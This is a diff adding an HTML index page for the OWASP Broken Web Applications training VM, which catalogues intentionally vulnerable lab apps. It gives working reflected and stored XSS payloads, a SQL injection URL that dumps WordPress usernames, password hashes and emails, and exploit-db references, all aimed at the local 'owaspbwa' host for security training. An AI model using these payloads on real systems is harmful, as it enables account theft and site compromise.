@@ -1,0 +1,119 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>OWASP Broken Web Applications - Vulnerabilities</title>
+<link rel="stylesheet" href="/index.css" type="text/css" media="screen" />
+</head>
+<body>
+<table><tr><td id="header"><img src="images/owasp.png"/></td><td id="header"><h1>OWASP Broken Web Applications - Vulnerabilities</h1></td></tr></table>
+<p>
+<h2>Training Applications</h2>
+<table>
+<tr><th><a name="WebGoat"></a><h3>OWASP WebGoat</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="Mutillidae"></a>Mutillidae</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="DVWA"></a>Damn Vulnerable Web Application</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="Ghost"></a>Ghost</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+<p>
+<h2>Demonstration Pages/Small Applications</h2>
+<table>
+<tr><th><a name="CSRFGuard"></a>OWASP CSRFGuard Test Application</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="MandiantStruts"></a>Mandiant Struts Forms</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa:8080/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit">http://owaspbwa:8080/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit</a></td>
+<tr><th><a name="ASPForms"></a>Simple ASP.NET Forms</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E">http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E</a></td></tr>
+<tr><th><a name="DOMXSS"></a>Simple Form with DOM Cross Site Scripting</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+
+<p>
+
+<h2>Web App Scanner Targets</h2>
+<table>
+<tr><th><a name="Vicnum"></a>OWASP Vicnum</th></tr>
+<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>High</td><td></td><td>When playing the game, the "correct" answer is stored in Base64 encoded form in a hidden form field named VIEWSTATE. An attacker can decode this value in order to determine the correct answer to the game or manipulate it.</td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/vicnum/cgi-bin/vicnum1.pl?player=Foo%3Cscript%3Ealert%281%29%3C%2Fscript%3E">http://owaspbwa/vicnum/cgi-bin/vicnum1.pl?player=Foo%3Cscript%3Ealert%281%29%3C%2Fscript%3E</a></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><p> 
+	To illustrate this issue, send a POST request</p> 
+	<p>POST <a class="ext-link" href="http://owaspbwa/vicnum/vicnum5.php"><span class="icon">http://owaspbwa/vicnum/vicnum5.php</span></a></p> 
+	<p>player=&lt;script&gt;alert(1)&lt;/script&gt;</p></td></tr>
+<tr><th><a name="Peruggia"></a>Peruggia</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+
+<p>
+
+<h2>Old (Vulnerable) Versions of Real Applications</h2>
+<table>
+<tr><th><a name="WordPress"></a>WordPress</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>High</td><td><a href="https://www.owasp.org/index.php/Command_injection">Command Injection</a></td><td>Reference: <a href="http://www.exploit-db.com/exploits/6/">http://www.exploit-db.com/exploits/6/</a> <p>Ensure the dictionary used has 'wordpress' in it.</p></td></tr>
+	<tr><td>High</td><td><a href="https://www.owasp.org/index.php/SQL_Injection">SQL Injection</a></td><td><a href="http://www.exploit-db.com/exploits/3656/">http://www.exploit-db.com/exploits/3656/</a></td></tr>
+	<tr><td>High (plugin)</td><td><a href="https://www.owasp.org/index.php/SQL_Injection">SQL Injection</a></td><td><a href="http://owaspbwa/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--">http://owaspbwa/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--</a> Reference: <a href="http://www.exploit-db.com/exploits/5486/">http://www.exploit-db.com/exploits/5486/</a></a></td></tr>
+	<tr><td>High (plugin)</td><td><a href="https://www.owasp.org/index.php/Top_10_2007-A3">Malicious File Execution</a></td><td>Reference: <a href="http://www.exploit-db.com/exploits/3814/">http://www.exploit-db.com/exploits/3814/</a></a></td></tr>
+<tr><th><a name="OrangeHRM"></a>OrangeHRM</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/orangehrm/templates/recruitment/jobVacancy.php?recruitcode=%3C/script%3E%3Cscript%3Ealert('Reflected%20XSS%20in%20OrangeHRM')%3C/script%3E">http://owaspbwa/orangehrm/templates/recruitment/jobVacancy.php?recruitcode=%3C/script%3E%3Cscript%3Ealert('Reflected%20XSS%20in%20OrangeHRM')%3C/script%3E</a></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td><p>Go to: <a href="http://owaspbwa/orangehrm/index.php?module=Home&menu_no=3&menu_no_top=ess">http://owaspbwa/orangehrm/index.php?module=Home&menu_no=3&menu_no_top=ess</a> as any user.</p>
+	<p>Set First name to: &lt;script&gt;alert('OrangeHRM First Name Stored XSS')&lt;/script&gt;</p>
+	<p>Log out, and log back in.</p>
+	</td></tr>
+<tr><th><a name="GetBoo"></a>GetBoo</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="GTDPHP"></a>GTD-PHP</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Projects are vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/project.php?type=p">http://owaspbwa/gtd-php/project.php?type=p</a></p>
+	<p>Set Project Name, Description, Desired Outcome to &lt;script&gt;alert('gtd-php Stored XSS Via Project')&lt;/script&gt;</p>
+	<p>Click Process, Projects</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Lists are vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/newList.php">http://owaspbwa/gtd-php/newList.php</a></p>
+	<p>Set List Title, Description to &lt;script&gt;alert('gtd-php Stored XSS Via Lists')&lt;/script&gt;</p>
+	<p>Click Process, Lists</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Waiting On is vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/item.php?type=w">http://owaspbwa/gtd-php/item.php?type=w</a></p>
+	<p>Set Waiting On Title, Description to &lt;script&gt;alert('gtd-php Stored XSS Via Waiting On')&lt;/script&gt;</p>
+	<p>Click Process, Waiting On</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Checklists are vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/newChecklist.php">http://owaspbwa/gtd-php/newChecklist.php</a></p>
+	<p>Set Checklist Title, Description to &lt;script&gt;alert('gtd-php Stored XSS Via Checklist')&lt;/script&gt;</p>
+	<p>Click Process, Checklists</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Contexts (space/time) are vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/newContext.php">http://owaspbwa/gtd-php/newContext.php</a></p>
+	<p>Set Context Name to &lt;script&gt;alert('gtd-php Stored XSS Via Context Name')&lt;/script&gt;</p>
+	<p>Click Process, Contexts</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Category is vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/newCategory.php">http://owaspbwa/gtd-php/newCategory.php</a></p>
+	<p>Set Category Name to &lt;script&gt;alert('gtd-php Stored XSS Via Category Name')&lt;/script&gt;</p>
+	<p>Click Process, Waiting On</p></td></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Stored XSS</a></td><td>Goals are vulnerable to XSS.
+	<p>Go to: <a href="http://owaspbwa/gtd-php/newGoal.php">http://owaspbwa/gtd-php/newGoal.php</a></p>
+	<p>Set Goal Title to &lt;script&gt;alert('gtd-php Stored XSS Via Goal Title')&lt;/script&gt;</p>
+	<p>Click Review, List Goals</p></td></tr>
+<tr><th><a name="Yazd"></a>Yazd</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/yazd10/bay/error.jsp?message=%3Cscript%3Ealert('Reflected%20XSS%20Via%20message%20Parameter')%3C/script%3E">http://owaspbwa/yazd10/bay/error.jsp?message=%3Cscript%3Ealert('Reflected%20XSS%20Via%20message%20Parameter')%3C/script%3E</a></td></tr>
+<tr><th><a name="phpBB"></a>phpBB</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="webcal">WebCalendar</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+
+<p>
+<h2>OWASP Demonstration Applications</h2>
+<table>
+<tr><th><a name="AppSensorDemo"></a>OWASP AppSensor Demo Application</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+
+<h2>Most Recent Version</h2>
+For the most recent version of the vulnerabilities included in this VM, please see <a href="http://sourceforge.net/apps/trac/owaspbwa/report/1">http://sourceforge.net/apps/trac/owaspbwa/report/1</a>.  
+</body></html>
